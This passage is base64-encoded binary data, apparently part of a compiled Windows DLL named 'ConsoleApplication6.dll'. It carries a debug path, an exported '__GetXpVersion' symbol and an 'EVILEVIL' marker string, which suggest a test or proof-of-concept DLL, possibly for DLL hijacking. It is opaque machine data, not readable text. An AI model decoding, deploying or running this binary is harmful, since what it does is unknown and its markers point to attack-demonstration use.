EAGkAcgAAAAAAAAAAAAAAAABEAEwATAAAAAAAAAAAAAAATQBTAFAARABCADEANAAwAAAAAAAAAAAATQBTAFAARABCADEANAAwAAAAAAAAAAAAUERCT3BlblZhbGlkYXRlNQAAAAByAAAAMOIBgAEAAADQ4gGAAQAAAAAAAAAAAAAAAAAAAGtz8FYAAAAAAgAAAIkAAACoygEAqLIAAAAAAABrc/BWAAAAAAwAAAAUAAAANMsBADSzAAAAAAAAAAAAAJQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA44AGAAQAAAAAAAAAAAAAAAAAAAAAAAAAAQAKAAQAAABBAAoABAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFJTRFNdQSKmv4AXT4Kyl7nAja8lQgAAAEM6XFVzZXJzXHNzdXRoZXJsYW5kXERvY3VtZW50c1xWaXN1YWwgU3R1ZGlvIDIwMTVcUHJvamVjdHNcQ29uc29sZUFwcGxpY2F0aW9uNlx4NjRcRGVidWdcQ29uc29sZUFwcGxpY2F0aW9uNi5wZGIAAAAAAAAAABkAAAAZAAAAAwAAABYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAF4RAYABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGQQAYABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA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AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/////wAAAAABAAAAAQAAAAEAAAABAAAAAQAAAAAAAAABAAAAAgAAAC8gAAAAAAAAAAAAAAAAAAAyot8tmSsAAM1dINJm1P//AAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA